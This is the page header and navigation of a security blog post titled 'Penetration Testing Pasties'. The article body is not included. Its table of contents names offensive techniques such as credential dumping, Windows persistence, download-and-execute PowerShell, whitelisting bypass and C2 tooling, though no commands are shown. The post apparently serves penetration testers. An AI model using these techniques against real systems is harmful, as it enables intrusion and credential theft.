



<!DOCTYPE html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="Threatexpress Blog">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../../img/favicon.ico">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.1.0">
    
    
      
        <title>Penetration Testing Pasties - Threatexpress</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/application.11e41852.css">
      
        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.22915126.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../../../assets/javascripts/modernizr.20ef595d.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../../css/extra.css">
    
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="bluegrey" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="__github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#penetration-testing-pasties" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../../.." title="Threatexpress" class="md-header-nav__button md-logo">
          
            <img src="../../../../img/threatexpress_logo.png" width="24" height="24">
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                Threatexpress
              </span>
              <span class="md-header-nav__topic">
                Penetration Testing Pasties
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  


  <a href="https://github.com/threatexpress/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#__github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      threatexpress/threatexpress
    </div>
  </a>

          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../../../.." title="Threatexpress" class="md-nav__button md-logo">
      
        <img src="../../../../img/threatexpress_logo.png" width="48" height="48">
      
    </a>
    Threatexpress
  </label>
  
    <div class="md-nav__source">
      


  


  <a href="https://github.com/threatexpress/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#__github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      threatexpress/threatexpress
    </div>
  </a>

    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      Blogs
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Blogs
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" checked>
    
    <label class="md-nav__link" for="nav-2-1">
      2019
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-1">
        2019
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-1" type="checkbox" id="nav-2-1-1" checked>
    
    <label class="md-nav__link" for="nav-2-1-1">
      1
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-1">
        1
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Penetration Testing Pasties
      </label>
    
    <a href="./" title="Penetration Testing Pasties" class="md-nav__link md-nav__link--active">
      Penetration Testing Pasties
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#foca" title="FOCA" class="md-nav__link">
    FOCA
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#maltego" title="Maltego" class="md-nav__link">
    Maltego
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconng" title="ReconNG" class="md-nav__link">
    ReconNG
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metagoofil" title="Metagoofil" class="md-nav__link">
    Metagoofil
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#censysio" title="censys.io" class="md-nav__link">
    censys.io
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dsnrecon" title="dsnrecon" class="md-nav__link">
    dsnrecon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#theharvester" title="TheHarvester" class="md-nav__link">
    TheHarvester
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nmap" title="Nmap" class="md-nav__link">
    Nmap
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ids-evasion" title="IDS Evasion" class="md-nav__link">
    IDS Evasion
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" title="Web" class="md-nav__link">
    Web
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#eyewitness" title="Eyewitness" class="md-nav__link">
    Eyewitness
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#built-in-commands" title="Built-in Commands" class="md-nav__link">
    Built-in Commands
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsquery" title="DSQUERY" class="md-nav__link">
    DSQUERY
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlcmd" title="SQLCMD" class="md-nav__link">
    SQLCMD
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsutil" title="NTDSUTIL" class="md-nav__link">
    NTDSUTIL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker" title="Applocker" class="md-nav__link">
    Applocker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-defender" title="Windows Defender" class="md-nav__link">
    Windows Defender
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appcmd" title="APPCMD" class="md-nav__link">
    APPCMD
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-lateral-movement" title="Windows Lateral Movement" class="md-nav__link">
    Windows Lateral Movement
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-persistence-methods" title="Windows Persistence Methods" class="md-nav__link">
    Windows Persistence Methods
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#registry-keys" title="Registry Keys" class="md-nav__link">
    Registry Keys
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modify-registry-keys" title="Modify registry keys" class="md-nav__link">
    Modify registry keys
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#userinit-key" title="Userinit Key" class="md-nav__link">
    Userinit Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-key" title="Run Key" class="md-nav__link">
    Run Key
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" title="List Image File Execution Options (Debugger file executed when the target file is run)" class="md-nav__link">
    List Image File Execution Options (Debugger file executed when the target file is run)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appinit_dlls" title="AppInit_DLLs" class="md-nav__link">
    AppInit_DLLs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-reboot-sethcutilman-option-using-a-debugger-key" title="No-reboot sethc/utilman option using a "debugger" key" class="md-nav__link">
    No-reboot sethc/utilman option using a "debugger" key
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-storage-locations" title="File Storage Locations" class="md-nav__link">
    File Storage Locations
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-folders" title="Startup Folders" class="md-nav__link">
    Startup Folders
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sethcutilman-replacement" title="SETHC/UTILMAN Replacement" class="md-nav__link">
    SETHC/UTILMAN Replacement
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#volume-shadow-copy-restore-points" title="Volume Shadow Copy (Restore Points)" class="md-nav__link">
    Volume Shadow Copy (Restore Points)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vssadmin-native-windows-utility" title="VSSADMIN – native windows utility" class="md-nav__link">
    VSSADMIN – native windows utility
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" title="Use WMIC process call to run an .exe from a Volume Shadow Copy" class="md-nav__link">
    Use WMIC process call to run an .exe from a Volume Shadow Copy
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task-scheduling" title="Task Scheduling" class="md-nav__link">
    Task Scheduling
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#at" title="AT" class="md-nav__link">
    AT
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schtasks" title="SCHTASKS" class="md-nav__link">
    SCHTASKS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#additional-notes" title="Additional Notes" class="md-nav__link">
    Additional Notes
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-service" title="Windows Service" class="md-nav__link">
    Windows Service
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" title="DLL-Hijacking" class="md-nav__link">
    DLL-Hijacking
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linkinfodll-replacement" title="linkinfo.dll Replacement" class="md-nav__link">
    linkinfo.dll Replacement
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-event-persistence-via-powershell" title="WMI Event Persistence via Powershell" class="md-nav__link">
    WMI Event Persistence via Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-event-filter" title="WMI Event Filter" class="md-nav__link">
    WMI Event Filter
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#event-consumer" title="Event Consumer" class="md-nav__link">
    Event Consumer
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filterconsumer-binding" title="Filter/Consumer Binding" class="md-nav__link">
    Filter/Consumer Binding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removal" title="REMOVAL" class="md-nav__link">
    REMOVAL
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malicious-outlook-rules" title="Malicious Outlook Rules" class="md-nav__link">
    Malicious Outlook Rules
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-remote-management-winrm-psremoting" title="Windows Remote Management (WinRM) / PSRemoting" class="md-nav__link">
    Windows Remote Management (WinRM) / PSRemoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uninstall-a-patch-to-leave-the-system-vulnerable" title="Uninstall a patch to leave the system vulnerable" class="md-nav__link">
    Uninstall a patch to leave the system vulnerable
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" title="Create custom DLL for password filters and install on DC to capture changed passwords" class="md-nav__link">
    Create custom DLL for password filters and install on DC to capture changed passwords
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#application-whitelisting-bypass-techniques" title="Application Whitelisting Bypass Techniques" class="md-nav__link">
    Application Whitelisting Bypass Techniques
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell" title="Powershell" class="md-nav__link">
    Powershell
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-files-custom" title="Find-Files (custom)" class="md-nav__link">
    Find-Files (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-enumeration-custom" title="Get-Enumeration (custom)" class="md-nav__link">
    Get-Enumeration (custom)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-and-execute-iex" title="Download and execute IEX" class="md-nav__link">
    Download and execute IEX
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#encodedcommand-and-iex-detection-bypass" title="EncodedCommand and IEX detection bypass" class="md-nav__link">
    EncodedCommand and IEX detection bypass
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" title="Bloodhound" class="md-nav__link">
    Bloodhound
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikittenz" title="Mimikittenz" class="md-nav__link">
    Mimikittenz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup" title="PowerUp" class="md-nav__link">
    PowerUp
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" title="PowerView" class="md-nav__link">
    PowerView
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#net-functions" title="net * Functions:" class="md-nav__link">
    net * Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-functions" title="GPO functions" class="md-nav__link">
    GPO functions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-hunting-functions" title="User-Hunting Functions:" class="md-nav__link">
    User-Hunting Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-trust-functions" title="Domain Trust Functions:" class="md-nav__link">
    Domain Trust Functions:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metafunctions" title="MetaFunctions:" class="md-nav__link">
    MetaFunctions:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" title="Inveigh" class="md-nav__link">
    Inveigh
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-requirements" title="Privilege Requirements:" class="md-nav__link">
    Privilege Requirements:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#features" title="Features:" class="md-nav__link">
    Features:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-wout-powershell" title="Powershell W/out Powershell" class="md-nav__link">
    Powershell W/out Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-indexeditem" title="Get-IndexedItem" class="md-nav__link">
    Get-IndexedItem
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interacting-w-windows-api" title="Interacting w/ Windows API" class="md-nav__link">
    Interacting w/ Windows API
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-lock-workstation-and-messagebox" title="Example – Lock Workstation and MessageBox" class="md-nav__link">
    Example – Lock Workstation and MessageBox
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mailsniper-owa-and-exchange-enumeration" title="MailSniper (OWA and Exchange Enumeration)" class="md-nav__link">
    MailSniper (OWA and Exchange Enumeration)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" title="Locate OWA instances via Autodiscover using only organization primary domain name" class="md-nav__link">
    Locate OWA instances via Autodiscover using only organization primary domain name
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" title="DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)" class="md-nav__link">
    DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-start-guide" title="Quick Start Guide" class="md-nav__link">
    Quick Start Guide
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-domainpasswordspray-options" title="Invoke-DomainPasswordSpray Options" class="md-nav__link">
    Invoke-DomainPasswordSpray Options
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misc-powershell-pasties" title="Misc Powershell Pasties" class="md-nav__link">
    Misc Powershell Pasties
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mimikatz" title="Mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberoast" title="Kerberoast" class="md-nav__link">
    Kerberoast
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#domain-admin-privesc-methods" title="Domain Admin Privesc Methods" class="md-nav__link">
    Domain Admin Privesc Methods
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#domain-fronting" title="Domain Fronting" class="md-nav__link">
    Domain Fronting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cobalt-strike" title="Cobalt Strike" class="md-nav__link">
    Cobalt Strike
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#opsec-considerations-for-beacon-commands" title="OPSEC Considerations for Beacon Commands" class="md-nav__link">
    OPSEC Considerations for Beacon Commands
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-function-wrapper" title="Powershell Function Wrapper" class="md-nav__link">
    Powershell Function Wrapper
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-scripts" title="Persistence Scripts" class="md-nav__link">
    Persistence Scripts
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#empire" title="EMPIRE" class="md-nav__link">
    EMPIRE
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c2-profiles" title="C2 Profiles" class="md-nav__link">
    C2 Profiles
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bash" title="BASH" class="md-nav__link">
    BASH
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
    
    <label class="md-nav__link" for="nav-2-2">
      2018
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-2">
        2018
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-1" type="checkbox" id="nav-2-2-1">
    
    <label class="md-nav__link" for="nav-2-2-1">
      11
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-2-1">
        11
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/" title="A Deep Dive into Cobalt Strike Malleable C2" class="md-nav__link">
      A Deep Dive into Cobalt Strike Malleable C2
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-2" type="checkbox" id="nav-2-2-2">
    
    <label class="md-nav__link" for="nav-2-2-2">
      6
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-2-2">
        6
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2018/06/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/" title="Threat Get's a Vote - Applying a Threat Based Approach to Security Testing" class="md-nav__link">
      Threat Get's a Vote - Applying a Threat Based Approach to Security Testing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-3" type="checkbox" id="nav-2-2-3">
    
    <label class="md-nav__link" for="nav-2-2-3">
      5
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-2-3">
        5
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2018/05/threat-mitigation-strategies-technical-recommendations-and-info-part-2/" title="Threat Mitagation Strategies - Part 2" class="md-nav__link">
      Threat Mitagation Strategies - Part 2
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-4" type="checkbox" id="nav-2-2-4">
    
    <label class="md-nav__link" for="nav-2-2-4">
      2
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-2-4">
        2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2018/02/automating-cobalt-strike-profiles-apache-mod_rewrite-htaccess-files-intelligent-c2-redirection/" title="Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection" class="md-nav__link">
      Automating Cobalt Strike Profiles Apache mod_rewrite htaccess Files for Intelligent C2 Redirection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-5" type="checkbox" id="nav-2-2-5">
    
    <label class="md-nav__link" for="nav-2-2-5">
      1
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-2-5">
        1
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2018/01/threat-mitigation-strategies-observations-recommendations/" title="Threat Mitagation Strategies - Part 1" class="md-nav__link">
      Threat Mitagation Strategies - Part 1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2018/01/hostenum-updates-usage/" title="HostEnum - Updates and Usage Guide" class="md-nav__link">
      HostEnum - Updates and Usage Guide
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      2017
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        2017
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3-1" type="checkbox" id="nav-2-3-1">
    
    <label class="md-nav__link" for="nav-2-3-1">
      10
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-3-1">
        10
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2017/10/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/" title="Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads" class="md-nav__link">
      Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3-2" type="checkbox" id="nav-2-3-2">
    
    <label class="md-nav__link" for="nav-2-3-2">
      09
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-3-2">
        09
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../2017/09/install-bloodhound-ubuntu/" title="Install BloodHound on Ubuntu" class="md-nav__link">
      Install BloodHound on Ubuntu
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
